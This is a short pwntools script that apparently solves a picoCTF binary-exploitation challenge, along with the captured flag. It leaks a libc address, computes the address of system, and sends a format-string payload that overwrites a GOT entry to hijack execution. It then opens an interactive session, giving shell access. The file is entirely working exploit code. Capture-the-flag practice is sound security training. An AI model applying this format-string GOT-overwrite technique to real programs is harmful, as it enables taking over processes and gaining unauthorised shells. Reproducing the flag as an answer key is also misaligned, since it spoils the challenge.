from pwn import *

context.binary = "./chall"

p = process()

#p = remote("rhea.picoctf.net",62317)

p.recvuntil(b'libc: ')

leak_libc = int(p.recvline().strip(b'\n'), 16)


log.info("Leaked libc: %s", hex(leak_libc))

system_func = leak_libc - 0x2ac90

payload = fmtstr_payload(38,{0x404018: system_func})
p.sendline(payload)
p.interactive()

#picoCTF{G07_G07?_92325514}
